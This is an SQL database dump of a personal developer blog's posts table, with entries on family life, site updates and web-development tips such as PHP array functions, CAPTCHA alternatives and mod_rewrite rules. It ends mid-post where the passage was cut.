-- phpMyAdmin SQL Dump
-- version 4.1.12
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Mar 13, 2015 at 10:12 PM
-- Server version: 5.6.16
-- PHP Version: 5.5.11

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `jtstiles`
--

-- --------------------------------------------------------

--
-- Table structure for table `js_blog`
--

CREATE TABLE IF NOT EXISTS `js_blog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '',
  `description` tinytext NOT NULL,
  `content` text NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `title` (`title`),
  FULLTEXT KEY `title_2` (`title`,`description`,`content`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='Pages on Areas' AUTO_INCREMENT=87 ;

--
-- Dumping data for table `js_blog`
--

INSERT INTO `js_blog` (`id`, `title`, `description`, `content`, `created`, `modified`) VALUES
(58, 'New Website! New Design!', '', '<p>It''s about time right? I''ve finally completed a fresh new look to my website, I hope you like it!&nbsp; There is sooo much more to come.&nbsp; I plan on developing a suite of applications and hosting them right here on my website.&nbsp; I''ll even let YOU use them, free of charge!&nbsp; How kewl is that!? Not only this, but I''m going to try my best to start posting useful content!&nbsp; So check back every now and then and maybe you''ll learn something and find out something kewl!</p>', '2010-10-29 21:46:19', '2011-05-16 01:40:54'),
(59, 'Halloween 2010 and an Update on Life!', '', '<p>My blog will be a place to share neat stuff I find, tips and tricks  that I''ve learned in various technologies, updates on my website and apps, and every once in a while  some updates on my life! So without further ado...</p>\r\n<p>Life has been busy for me!&nbsp; I have the rest of November to finish up PALMS before the system goes into a one month pre-release phase.&nbsp; During this phase, we go live with a small subset of clients and staff will use the system just as if it was in full production.&nbsp; After the phase ends, a brief review period will follow and then the system will be released and everyone in the company will start using it every single day.&nbsp; It''s a big thing and if I said I wasn''t nervous, I''d be completely lying, but I think it''s going to be really great for everyone.</p>\r\n<p>Outside of work and PALMS, I''ve just been busy with family and the day-to-day responsibilities that come with it.&nbsp; However, I''ve been giving myself time for other things too such as watching Lois &amp; Clark: The Adventures of Superman and playing the Wii Fit Plus.&nbsp; The Wii Fit is pretty fun!&nbsp; I like Rhythm Boxing, Advanced Step, Kung Fu, Snowball Fight, and Hula Hoop.&nbsp; Although, I could do without that last one.&nbsp; I have been doing the 6 minute Hula Hoop and my sides kill after I finish! I think the highest I''ve gotten was over 1700!&nbsp; But Christy''s got me beat on that... she''s over 1900!&nbsp; I don''t think I can even compete, I don''t have the hips that she has.&nbsp; However, I do have her beat at pretty much everything else! Mwhahaha!</p>\r\n<p>As for the kids, they are learning a lot from school.&nbsp; Alaina has been getting better reading and writing, and Nathan has been working on cutting, ABCs, and his speech.&nbsp; Outside of school, the kids and I are usually wrestling, playing games, and just having fun together.&nbsp;</p>\r\n<p>As you know, last weekend was Halloween! Saturday we took a 15 minute trip to Tillson Street in Romeo, MI.&nbsp; If you haven''t heard about it, the whole street decorates their front yards with all sorts of scary and fun stuff.&nbsp; It''s especially good at night.&nbsp; When we went, the whole street was full of people; there were even lines to get from house to house.&nbsp; We saw a huge scary pirate ship, ghosts and skeletons galore, a guy getting electricuted, tons of pumpkins, scary people dressed up in costumes and a whole bunch more.&nbsp; <a href="index.php?area=Photos&amp;page=Halloween%202010">Check out the pictures by clicking here</a>.</p>\r\n<p>Sunday was Halloween! We dressed up the kids and went out to a local area with some friends and did the trick-or-treat thang.&nbsp; The kids got loads of candy!&nbsp; Both of them had like 6+ full size candy bars too! SCORE!&nbsp; <a href="index.php?area=Photos&amp;page=Halloween%202010">Check out the pictures here.</a></p>\r\n<p>Next weekend, we''re shooting family pictures so check back in a week or so to see ''em!&nbsp;</p>', '2010-11-04 17:22:39', '2011-05-16 01:40:54'),
(60, 'Merry Christmas and Happy New Year!', '', '<p>It''s been really busy around here with all the holidays and working, but  I did find some time to get on here and wish you all a very Merry  Christmas and a Happy New Year!</p>', '2010-12-23 22:02:22', '2011-05-16 01:40:54'),
(61, 'My Resume is Up!', '', '<p>If you haven''t noticed, there''s a new menu!&nbsp; I''ve just started  creating my online resume which I plan to keep updated whenever anything  on it might change.&nbsp; So far there''s only a few pages, but important ones nonetheless:</p>\r\n<ul>\r\n<li><a href="index.php?area=Resume&amp;page=Education">Education </a>- where I''ve attended school and the degree''s I''ve attained</li>\r\n<li><a href="index.php?area=Resume&amp;page=Skill List">Skills </a>- a listing of skills I''ve learned over the years</li>\r\n<li><a href="index.php?area=Resume&amp;page=Work History">Work History</a> - a summary of the places I''ve worked at and the valuable experience I''ve gained</li>\r\n</ul>\r\n<p>I plan to tweak and add a bit more to it and after that I think I''ll start working on building my portfolio a bit more!&nbsp; Keep checking back!</p>', '2011-01-30 20:59:47', '2011-05-16 01:40:54'),
(62, 'About Me Updated!', '', '<p>I updated my <a class="link" href="index.php?area=11">About Me</a> page to be...better! Go look! <img title="Sealed" src="bin/js/tinymce/plugins/emotions/img/smiley-sealed.gif" alt="Sealed" border="0" /></p>\n<p>It''s nothing too fancy, but it''s so much better than the novel I use to have on there that is actually now my <a class="link" href="index.php?area=11&amp;page=Biography">biography </a>page!&nbsp;</p>\n<p>Whew, things are steadily improving around here, more to come!</p>', '2011-02-01 22:01:59', '2011-05-16 01:40:54'),
(63, 'Check out my latest design: Potestivolaw.com', '', '<p><a href="portfolio/potestivolaw/Potestivolaw.gif" target="_blank"><img style="float: left; margin-right: 5px;" title="Potestivolaw.com" src="portfolio/potestivolaw/Potestivolaw-Thumb.gif" alt="Potestivolaw.com" width="200" height="131" /></a>So the company I work for was in bad need of a new website. &nbsp;One that was search engine friendly, user-friendly, and professional looking. &nbsp;I''m happy to say I''ve accomplished all that and more! &nbsp;Their new website is built off <a class="link" href="index.php?area=Projects&amp;page=PALMS">PALMS</a>, the case management system I''ve been building for them. &nbsp;Because of my technology, the website can be managed easily by anyone even if they don''t have any programming experience! It works great in all browsers and makes use of the latest trends in web development with the exception of HTML5 - I couldn''t do too much with this yet because some of the company''s clients are using older browsers... ugh, but rest assured - the website was built for the future too! &nbsp;We can easily upgrade it down the road when the time comes.</p>\n<p>Check out the website at <a class="link" href="http://www.potestivolaw.com">http://www.potestivolaw.com</a>.</p>', '2011-04-05 17:45:15', '2011-05-16 01:40:54'),
(64, 'Updated System and Design!', '', '<p><span style="font-size: small;">Do you like the new design? It''s really...SIMPLE! &nbsp;I like it. My website is also running on a completely new version of the Knots Content Management System as well... best version yet, by far! &nbsp;The new version focuses on expandability, so when Knots is released to the public - developers will be able to expand the system and add new functionality with ease! &nbsp;It''s a very important update and I''m glad it''s finally finished! &nbsp;</span></p>', '2011-04-03 18:34:19', '2011-05-16 01:40:54'),
(65, 'SEO Demystified: Part 1', '', '<p>Yesterday, I had the opportunity to sit in on the first part of a two-part series on SEO - Search Engine Optimization. &nbsp;It was given by Jonathan Hoekman of Experts Exchange/Expertbase. &nbsp;Part 1 of this series goes over keywords: their relevance, how to choose keywords, some tools you can use to find relevant keywords for your site, and more. &nbsp;I found it very informational. &nbsp;The second part will be even better &nbsp;Jonathan will be talking about Site Architecture, Internal Linking Strategies, On-Page Elements for SEO, and how to build links.</p>\n<p>Here it is, enjoy!</p>\n<p><iframe title="YouTube video player" src="http://www.youtube.com/embed/Cr_Dsn8RW3o" frameborder="0" width="480" height="390"></iframe></p>', '2011-04-27 08:03:30', '2011-05-16 01:40:54'),
(66, '5 Helpful PHP Array Functions', 'Five helpful PHP array functions', '<p>PHP has many nice functions for handling arrays already, but I found myself needing some extra arraythmetic (ha!), and here they are for you to use as freely as you choose!</p>\r\n<h2>array_clean</h2>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: array_clean\r\n*	Purpose: Trims whitespace and slashes from every element in an array, and\r\n*		removes any elements containing only whitespaces.\r\n*	@param array - the array to clean\r\n*	@param maintain_index - true to maintain index association, false otherwise\r\n*	@return a \\''clean\\'' array without whitespaces or blank elements\r\n*/\r\nfunction array_clean($array, $maintain_index = false) {\r\n	$arr = array();\r\n	\r\n	foreach($array as $key=&gt;$val) {\r\n		$val = stripslashes(trim($val));\r\n		\r\n		if($val != \\"\\") {\r\n			if($maintain_index) {\r\n				$arr[$key] = $val;\r\n			} else {\r\n				array_push($arr,$val);\r\n			}\r\n		}\r\n	}\r\n	\r\n	return $arr;\r\n}\r\n</pre>\r\n<h2>array_has_empty_val</h2>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: array_has_empty_val\r\n*	Purpose: Checks to see if any of the values inside the array are empty\r\n*	@param arr - the array to check\r\n*	@return true if an empty value exists, false otherwise\r\n*/\r\nfunction array_has_empty_val($arr) {\r\n	if(is_array($arr)) {\r\n		foreach($arr as $a) {\r\n			if(is_array($a)) {\r\n				if(array_has_empty_val($a)) {\r\n					return true;\r\n				}\r\n			} else if(trim($a) == \\"\\") {\r\n				return true;\r\n			}\r\n		}\r\n		return false;\r\n	} else if(trim($arr) == \\"\\") {\r\n		return true;\r\n	} else {\r\n		return false;\r\n	}\r\n}\r\n</pre>\r\n<h2>array_index_of</h2>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: array_index_of\r\n*	Purpose: retrieves the index (key) for the specified element\r\n*	@param arr - the array to look through\r\n*	@param el - the element to match with\r\n*	@return the index of the value if found, false otherwise\r\n*/\r\nfunction array_index_of($arr, $el) {\r\n	if(is_array($arr)) {\r\n		foreach($arr as $key=&gt;$val) {\r\n			if($val == $el) {\r\n				return $key;\r\n			}\r\n		}\r\n	}\r\n	\r\n	return false;\r\n}\r\n</pre>\r\n<h2>array_make</h2>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: array_make\r\n*	Purpose: Makes an array out of a delimited string of data\r\n*	@param string - the delimited string to convert to an array\r\n*	@param delim - the delimiter to use in making the array\r\n*	@return a clean array of the data\r\n*/\r\nfunction array_make($string, $delim = \\'',\\'') {\r\n	return array_clean(explode($delim, $string));\r\n}\r\n</pre>\r\n<h2>array_remove</h2>\r\n<pre class=\\"prettyprint\\">/**\r\n* Method: array_remove\r\n*	Purpose: Removes an element within the array\r\n*	@param array - the array to search through\r\n*	@param item - the item to remove\r\n*/\r\nfunction array_remove($array, $item) {\r\n	$new_arr = array();\r\n	\r\n	foreach($array as $key=&gt;$val) {\r\n		if($item == $val) continue;\r\n		$new_arr[$key] = $val;\r\n	}\r\n	\r\n	return $new_arr;\r\n}\r\n</pre>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\n$(document).ready(function() {\r\n    prettyPrint();\r\n});\r\n// ]]></script>', '2011-05-03 11:52:43', '2011-05-18 20:59:38'),
(67, 'SEO Demystified: Part 2', '', '<p>Today, I sat in on the second part of a two-part series on SEO by Jonathan Hoekman. &nbsp;Much better than the first - covered much more useful information about on-site and off-site optimization. &nbsp;More specifically, the importance of sitemaps (both txt and xml), robots.txt files and why you would want to block certain pages, internal linking, url structure and much more. &nbsp;It really has quite a bit of useful information especially if you are new to SEO.</p>\n<p>Enjoy!</p>\n<p><iframe src="http://www.youtube.com/embed/8if69iU4YVY" frameborder="0" width="480" height="390"></iframe></p>', '2011-05-05 17:11:48', '2011-05-16 01:40:54'),
(68, 'Alternatives to CAPTCHA', 'Alternatives to using CAPTCHA to prevent bots from submitting forms on your website', '<p>By now all of us at one time or another have had to read a construed image and type the letters and numbers we saw into a textbox. &nbsp;This test is what is known as a CAPTCHA, and it prevents bots (programs created to spam websites among other objectives) from submitting a form on a website. &nbsp;The reason it prevents bots from submitting a form (and its agenda) is because bots can\\''t decipher the text within an image, and thus it cannot fill out the correct response in the textbox. &nbsp;Although there are ways around CAPTCHAs for the most sophisticated bots, you can be relatively sure that a form submission is from a human in using this test.</p>\r\n<h2>A Random CAPTCHA Example</h2>\r\n<p><img title=\\"Captcha Example - Randomly Generated\\" src=\\"../bin/lib/captcha.php\\" alt=\\"Captcha Example - Randomly Generated\\" width=\\"200\\" height=\\"55\\" /></p>\r\n<p>You can refresh this page any number of times and each time you should see a different CAPTCHA image above. &nbsp;Pretty cool, right? Generating an image like this on the fly isn\\''t so bad at all actually, but I\\''ll save that post for a different day! Instead, I\\''ll present some other types of tests you can use in place of CAPTCHA.</p>\r\n<h2>The Math Test</h2>\r\n<p>This one is really simple to implement. &nbsp;All you do is place a field on the form that asks a simple math question:</p>\r\n<p><em>What is 1 + 2?&nbsp;</em><input type=\\"text\\" value=\\"3\\" size=\\"3\\" /></p>\r\n<p>Once the form is submitted, the form handler checks to see if the value in this field is \\"3\\". &nbsp;If it is, we can say it was a human that submitted the form! &nbsp;I\\''d prefer solving a simple math problem over typing the letters and numbers I see in an image any day of the week! &nbsp;Of course, this test is completely capable of solving for the more sophisticated bots, but nevertheless - it\\''s an alternative! &nbsp;You could ask other types of questions too (i.e. is fire hot or cold?), not just math questions; just make sure it\\''s easy to answer!</p>\r\n<h2>The JavaScript Trick</h2>\r\n<p>Typical bots can\\''t execute JavaScript; so this test involves writing a bit of JavaScript code to dynamically add a field to a form. &nbsp;The form handler (again, on the server-side) checks to see if the field was submitted; if it wasn\\''t, then we know a bot tried to submit the form! &nbsp;Cake. &nbsp;Here\\''s some example code that dynamically adds a textfield to a form:</p>\r\n<pre class=\\"prettyprint\\">function addFieldTo(form_id) { \r\n    var form = document.getElementById(form_id); \r\n    var textbox = document.createElement(\\''input\\''); \r\n    textbox.type=\\"text\\"; \r\n    textbox.name=\\"test\\"; \r\n    textbox.style.display=\\"none\\"; \r\n    form.appendChild(textbox); \r\n}\r\n</pre>\r\n<p>In the code above, I am creating a textbox (input field) with a name of \\"test\\" and setting its CSS display property to \\"none\\" because I don\\''t want my human visitors to see the textbox. Why make them fill out an additional field if it\\''s not necessary? Now in the form handler, I would just check to see if a field with the name of \\"test\\" was submitted. &nbsp;Like I said, cake!</p>\r\n<h2>The CSS Trick</h2>\r\n<p>Bots like to make sure they fill out every field on a form to better their chances of submitting a form. &nbsp;This trick places a simple input field on the form again and hides it from humans. &nbsp;The form handler then simply checks to see if the field is blank upon submission. &nbsp;If it is, we can say it was a human! If not, it\\''s a bot!</p>\r\n<h2>My Recommendation</h2>\r\n<p>The more sophisticated the test is, the less submissions you\\''ll get from bots. &nbsp;Always go with what makes the most sense to you and your situation, but always think about HUMANS FIRST, and bots second. &nbsp;After all, your website is for humans to use, not bots!&nbsp;</p>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\n$(document).ready(function() {\r\n    prettyPrint();\r\n});\r\n// ]]></script>', '2011-05-06 13:45:30', '2011-05-18 20:58:42'),
(69, 'Random Tips on Web Development', 'Random tips on web development; checking all checkboxes in a list with jQuery; PHP\\''s strtotime function; graying out the screen using CSS', '<p>Every once in a while, I\\''ll be posting some tips on web development. &nbsp;These are tips I may have gotten from the web or from my own experience, and they could be on anything related to web development. &nbsp;So without further ado, here are the first tips of many to come!</p>\r\n<h2>Tip #1: Using jQuery to \\"Check All\\" checkboxes in a list</h2>\r\n<p>This is a handy tip I\\''ve incorporated in many of my projects. &nbsp;If you have a list of checkboxes, it\\''s nice to give the user the option of checking all the boxes with one click instead of making the user check them all individually. &nbsp;In that same respect, it\\''s nice to uncheck all of them with just one click too. &nbsp;Here\\''s an example:</p>\r\n<ul id=\\"checkbox_example\\">\r\n<li><label><input onclick=\\"$(\\''#checkbox_example\\'').find(\\''input\\'').attr(\\''checked\\'',this.checked);\\" type=\\"checkbox\\" name=\\"check_all\\" value=\\"\\" /> Check all</label></li>\r\n<li><label><input type=\\"checkbox\\" name=\\"boxes[]\\" value=\\"1\\" /> Box #1</label></li>\r\n<li><label><input type=\\"checkbox\\" name=\\"boxes[]\\" value=\\"2\\" /> Box #2</label></li>\r\n<li><label><input type=\\"checkbox\\" name=\\"boxes[]\\" value=\\"3\\" /> Box #3</label></li>\r\n<li><label><input type=\\"checkbox\\" name=\\"boxes[]\\" value=\\"4\\" /> Box #4</label></li>\r\n<li><label><input type=\\"checkbox\\" name=\\"boxes[]\\" value=\\"5\\" /> Box #5</label></li>\r\n</ul>\r\n<p>Here\\''s the code for the onclick handler of the \\"Check all\\" checkbox:</p>\r\n<pre>$(\\''#checkbox_example\\'').find(\\''input\\'').attr(\\''checked\\'',this.checked);\r\n</pre>\r\n<p>If you click on the \\"Check all\\" checkbox; all the boxes become checked. If you click on the \\"Check all\\" checkbox a second time; all the boxes become unchecked. To do this, the onclick attribute of the \\"Check all\\" checkbox is used to first find the list I created and all input fields within it. It then assigns the \\''checked\\'' attribute of any checkboxes it finds to either true or false depending on if the \\"Check all\\" box is checked (true) or not (false).</p>\r\n<p>This could\\''ve been done differently. Instead of using</p>\r\n<pre>.find(\\''input\\'')</pre>\r\n<p>in the code, I could\\''ve been more precise and used</p>\r\n<pre>.find(\\"input[name=\\''boxes[]\\'']\\")</pre>\r\n<p>Heck, I didn\\''t even have to put the code in the onclick attribute of the \\"Check all\\" checkbox; I could\\''ve placed it outside of that element in either the head or body tags, but hey... it\\''s just a simple tip!</p>\r\n<h2>Tip #2: PHP\\''s strtotime function</h2>\r\n<p>I just love this function - it is so handy! &nbsp;The strtotime function takes one argument (an english textual datetime description per the PHP manual) and converts it into a unix timestamp! Check out these examples:</p>\r\n<pre>$timestamp1 = strtotime(\\"now\\"); //converts the current date and time to a unix timestamp\r\n$timestamp2 = strtotime(\\"May 5 1979 8:00pm\\"); //converts to 294782400\r\n$timestamp3 = strtotime(\\"tomorrow + 3 days\\"); //converts tomorrow\\''s date to a unix timestamp and adds 3 days to it\r\n</pre>\r\n<p>If you want to convert the timestamp back into a normal date/time string, you can use PHP\\''s date() function like so:</p>\r\n<pre>echo date(\\"m/d/Y h:i A\\", $timestamp2); //outputs 5/5/1979 8:00 PM\r\n</pre>\r\n<p>For more complete information, see the <a class=\\"link\\" href=\\"http://php.net/manual/en/function.strtotime.php\\" target=\\"_blank\\">strtotime function on PHP.net</a>&nbsp; or the <a class=\\"link\\" href=\\"http://php.net/manual/en/function.date.php\\" target=\\"_blank\\">date function on PHP.net</a>.</p>\r\n<h2>Tip #3: Graying Out the Screen using CSS</h2>\r\n<p>You are probably used to modal popups by now where a box may pop up inside the page you are viewing, and the content behind the popup is grayed out. &nbsp;Here\\''s the CSS code to do it:</p>\r\n<pre>div.grayOut {\r\n    -moz-opacity:0.70; /* FireFox */\r\n    background-color: #000000;\r\n    background-repeat: repeat;\r\n    filter: alpha(opacity=70); /* IE */\r\n    height: 100%;\r\n    left: 0px;\r\n    opacity: 0.7; /* Safari, Opera */\r\n    overflow:scroll;\r\n    position: fixed;\r\n    top: 0px;\r\n    width: 105%;\r\n    z-index: 1000;\r\n}\r\n</pre>\r\n<p>Here I\\''m using a div element and the necessary code to accomplish the effect in all modern browsers. Basically, the code fills a div with black color that takes up 100% of the user\\''s screen and makes it 30% transparent (opaque). You\\''ll want to set the z-index high enough so that the div overlaps all other elements on the page, but low enough so that it doesn\\''t overlap your modal window. Giving the div a \\"fixed\\" position makes it so the grayed out div doesn\\''t move when the user scrolls (in case of longer pages).</p>\r\n<p><a class=\\"link\\" onclick=\\"$p.popups.init(\\''BlogPost\\'').load(\\''My Recent Blog Posts&amp;id=14\\'');\\" href=\\"javascript:void(0);\\">Click for Demo of Grayed Out effect</a></p>', '2011-05-09 13:06:56', '2011-05-16 19:32:48'),
(70, 'The Tiny Guide to MOD_REWRITE for Apache Web Server', 'How to use MOD_REWRITE on the Apache Web Server for creating user-friendly and search engine friendly URLs.', '<p>MOD_REWRITE is a module for the Apache Web Server that assists in cleaning up messy-looking URLs like this one:</p>\r\n<pre>http://jstiles.com/index.php?area=Blog&amp;page=My latest blog posts&nbsp;</pre>\r\n<p>...and replacing them with more user-friendly URLS like this one:</p>\r\n<pre>http://jstiles.com/Blog/My latest blog posts</pre>\r\n<h2>Advantages of \\"Friendly\\" URLs</h2>\r\n<p>The following are just a few reasons why you should use MOD_REWRITE and/or make the URLs to your website more user-friendly. &nbsp;</p>\r\n<p><strong>Friendly URLS Are Easier For Search Engines to Index</strong></p>\r\n<p>This is probably the biggest reason. &nbsp;Some search engines won\\''t index messy URLs which can negatively impact your search engine ranking. Luckily, the big search engines like Bing and Google have no problem indexing messy URLs, but that doesn\\''t mean you shouldn\\''t bother. &nbsp;There are other advantages; read on!</p>\r\n<p><strong>Visitors Like URLS They Can Understand and Read</strong></p>\r\n<p>It may even nudge them to bookmark a URL. &nbsp;Also, it\\''s WAY easier to remember a friendly URL over a messy one.</p>\r\n<p><strong>Better For Security and Maybe Even Your Peace of Mind</strong></p>\r\n<p>Friendly URLs mask the parameters that are actually used to display a page on a website. &nbsp;This makes it harder for hackers to access your website with a front door attack. &nbsp;Also, it masks filenames which can give hackers an idea of how your website operates.</p>\r\n<h2>How To Use MOD_REWRITE</h2>\r\n<p>Here are the steps to take to enable MOD_REWRITE and begin using it to make your URLs more user-friendly:</p>\r\n<p><strong>1. Let Apache Know You Want To Use MOD_REWRITE</strong></p>\r\n<p>Edit your httpd.conf (apache configuration file) and look for \\"rewrite_module\\" or \\"mod_rewrite\\"; uncomment it (take out the leading # character).</p>\r\n<p><strong>2. Create a .htaccess File</strong></p>\r\n<p>Create a .htaccess file in the directory you want to use rewrite rules in. &nbsp;In the .htaccess file, put the following on a new line:</p>\r\n<pre>RewriteEngine on</pre>\r\n<p>This lets Apache know you will be using the rewrite engine in the directory the .htaccess file resides in.</p>\r\n<p><strong>3. Create the rewrite rules. &nbsp;</strong></p>\r\n<p>First, you need to understand the syntax for a rewrite rule:</p>\r\n<pre>RewriteRule  [pattern] [substitution]</pre>\r\n<p>[pattern] is where you will input a regular expression and is where you will input the actual address (the messy URL!) that your server will forward the request to. &nbsp;</p>\r\n<p>For example, my website structures content by category (area) and page. &nbsp;A request to the \\"Blog\\" category and the \\"My latest blog posts\\" page would look like this (messy url):&nbsp;</p>\r\n<pre>http://jstiles.com/index.php?area=Blog&amp;page=My latest blog posts</pre>\r\n<p>The parameters here are \\"area\\" and \\"page\\" and their values are \\"Blog\\" and \\"My latest blog posts\\" respectively. &nbsp;I want my visitors to be able to access the URL above in a more user-friendly way, like this:</p>\r\n<pre>http://jstiles.com/Blog/My latest blog posts</pre>\r\n<p>Here\\''s my rewrite rule to accomplish this:</p>\r\n<pre>RewriteRule ^([^/.]+)/?([^/.]+)$ index.php?area=$1&amp;page=$2 [L]</pre>\r\n<p>Let me break this down for you.</p>\r\n<p>^ - means to match the beginning of the query string (so we\\''ll be matching the category/area first)</p>\r\n<p>([^/.]+) - means to match one or more characters that aren\\''t a forward slash or a period and place the result into a variable: $1. &nbsp;There are two of these that occur in the expression. &nbsp;The first one will be placed into a variable: $1 and the second into $2. &nbsp;If I had a third, it would be placed in $3. &nbsp;Anything enclosed in parentheses returns a variable of which can be used in the substitution portion of the RewriteRule.</p>\r\n<p>/? - means to look for a forward slash. &nbsp;Since the category/area title will be followed by a forward slash, I\\''ve placed this after my first set of parentheses.</p>\r\n<p>$ - is the closing of the pattern</p>\r\n<p>In the [substitution] portion of the rule, you can see that I used $1 and $2 to substitute the matches for the area and page titles respectively. The [L] on the end means that if this rule makes a match then all RewriteRules following will be ignored. &nbsp;This means that I could have RewriteRules above the one I\\''ve specified above to capture other URL forms.</p>\r\n<p><strong>4. Save The File And Test It Out!</strong></p>\r\n<p>Once you\\''ve got your rule(s) in place, save the .htaccess file and load up a page to see if it works. &nbsp;To test mine, I would navigate to http://jstiles.com/Blog/My latest blog posts to see if the page comes up or not. &nbsp;If it didn\\''t, clearly I have something wrong in my rule; you may need to do some trial and error to get it right depending on your setup. &nbsp;Practice makes perfect!</p>\r\n<h2>MOD_REWRITE is Powerful</h2>\r\n<p>Use it for good, not evil. &nbsp;Good luck! For more information on MOD_REWRITE check out <a class=\\"link\\" href=\\"http://httpd.apache.org/docs/1.3/mod/mod_rewrite.html\\" target=\\"_blank\\">MOD_REWRITE on Apache.org</a>.</p>', '2011-05-10 12:10:52', '2011-05-16 19:32:02'),
(71, 'Friday\\''s Web Roundups', 'Useful articles relating to web development and other interesting topics', '<p>Each Friday I take a look around the web and post some of the favorite articles and stories I\\''ve read about relating to web development and other interesting topics. &nbsp;Here\\''s what I liked reading about this past week:</p>\r\n<h2><a href=\\"http://davidwalsh.name/snackjs\\">SnackJS: A Tiny-But-Tasty JavaScript Framework by David Walsh</a></h2>\r\n<p>I\\''ve recently found David Walsh\\''s blog very useful! He\\''s an accomplished web developer and has many useful posts on JavaScript, PHP, MooTools, jQuery, CSS and more. &nbsp;In this article, David introduces you to the SnackJS JavaScript framework. &nbsp;<a class=\\"link\\" href=\\"http://www.snackjs.com\\" target=\\"_blank\\">SnackJS </a>is a much smaller JavaScript library when comparing to jQuery or MooTools. &nbsp;\\"Because sometimes, all you need is a snack\\". &nbsp;</p>\r\n<h2><a href=\\"http://net.tutsplus.com/tutorials/php/how-to-work-with-php-and-ftp/\\">How to Work with PHP and FTP by Jarrod Oberto on Net.TutsPlus.com</a></h2>\r\n<p>Nettuts is an excellent resource for many tutorials relating to web development (PHP, CSS, jQuery, JavaScript and more). &nbsp;In this article, Jarrod shows you how to create an FTP class in PHP. &nbsp;I didn\\''t even know about FTP in PHP before I read this article! &nbsp;I was shocked, but now I\\''m enlightened.</p>\r\n<h2><a class=\\"link\\" href=\\"http://www.webdesignerdepot.com/2011/05/dos-and-donts-for-designing-email-newsletters/\\">Do\\''s and Don\\''ts for Designing Email Newsletters by Cameron Chapman on WebDesignerDepot.com</a></h2>\r\n<p>Email Newsletters is something I\\''m definitely interested in and this was a good introduction about them and the \\"Do\\''s and Don\\''ts\\" of designing them.&nbsp;</p>\r\n<h2><a class=\\"link\\" href=\\"http://www.dumblittleman.com/2008/02/20-ways-to-get-rid-of-your-debt-for.html\\">20+ Ways to Get Rid of Your Debt on DumbLittleMan.com</a></h2>\r\n<p>A very good overview of what you should be doing to get rid of your debt. &nbsp;I\\''ve actually created a Balance Forecaster application for myself to track my expenditures and \\"forecast\\" what my checking account balance will look like for the next 3 months. &nbsp;However, it\\''s not ready for the public yet, but keep an eye out for it here on my website because I plan to include in my apps section!</p>\r\n<p><strong>That\\''s all for now, but keep checking back! Enjoy your weekend!&nbsp;</strong></p>', '2011-05-15 21:34:00', '2011-05-16 19:31:28'),
(72, 'New App: CSS Image Sprite Generator', 'CSS Image Sprite Generator - easily create CSS Image Sprites with this tool', '<p>I\\''ve just released a new application for you CSS developers out there - a CSS Image Sprite Generator. &nbsp;Enjoy!</p>\r\n<p><strong>CSS Image Sprite Generator</strong> | Demo: <a class=\\"link\\" href=\\"../Applications/CSS-Image-Sprite-Generator\\">Click Here</a></p>\r\n<div class=\\"app\\"><a href=\\"../Applications/CSS-Image-Sprite-Generator\\"><img style=\\"float: left; margin-left: 5px;\\" title=\\"CSS Image Sprite Generator\\" src=\\"../apps/css_sprite_generator/images/CSSImageSpriteGenerator.gif\\" alt=\\"CSS Image Sprite Generator\\" width=\\"80\\" height=\\"80\\" /></a></div>\r\n<div class=\\"app_desc\\">\r\n<p>The CSS Image Sprite Generator takes a zip file containing images in either GIF, PNG or JPG format and creates a CSS Sprite out of them (a sprite is one image containing multiple images). &nbsp;This tool will create the CSS sprite for you to download and generate CSS code for you to use in your design.</p>\r\n</div>', '2011-04-06 19:56:12', '2011-05-16 19:31:01'),
(73, 'How To Implement Keyboard Shortcuts In Your Web Application - Part 1', 'How to capture keyboard shortcut events with JavaScript', '<p>Many of us are familiar with what CTRL + Z does (it undos the last thing you did in many applications) or what CTRL + O does (opens something). &nbsp;These are called keyboard shortcuts. &nbsp;Web applications can take advantage of keyboard shortcuts too with just a small amount of code. &nbsp;This three part series will cover the following:</p>\r\n<ol>\r\n<li>How to Capture Keyboard Shortcuts with JavaScript</li>\r\n<li><a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shortcuts-in-Your-Web-Application---Part-2\\">Reacting to Keyboard Shortcut Events</a></li>\r\n<li><a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shorcuts-in-Your-Web-Application---Part-3\\">How To Use Keyboard Shortcuts For Good and not Evil</a></li>\r\n</ol>\r\n<h2>How to Capture Keyboard Shortcuts with JavaScript | Demo: <a class=\\"link\\" href=\\"../demos/Keyman.html\\">Click Here</a></h2>\r\n<p>Obviously, we need to be able to capture when a user presses a key on the keyboard. We also need to figure out which key was pressed and then do something about it. &nbsp;To do this we need to take advantage of two different events in JavaScript: onkeydown and onkeyup. &nbsp;You might be wondering why we wouldn\\''t use JavaScript\\''s onkeypress event here? In JavaScript, each key that is pressed fires off three events: one when the key is fully pressed (onkeydown), one when the key is released (onkeyup), and one when the key is both fully pressed and then released (onkeypress). &nbsp;If we only used the onkeypress event, we couldn\\''t compare previous key presses to the current key pressed; which basically means our application couldn\\''t take advantage of modifiers and other combinations (i.e. we could act on either the \\"CTRL\\" or \\"Z\\" keys being pressed, but not both when used together one right after the other). &nbsp;</p>\r\n<p>To capture when the user presses a key on the page we must tell the browser that we want to record both events no matter what element on the page has focus:</p>\r\n<pre>&nbsp;</pre>\r\n<p>We are attaching the events to the HTML body tag. &nbsp;When the user fully presses a key on their keyboard, the keyman.add(event) function is called no matter what element on the page has focus. &nbsp;Then when the user releases the key, the keyman.remove(event) function is called. &nbsp;Both functions take a window.event 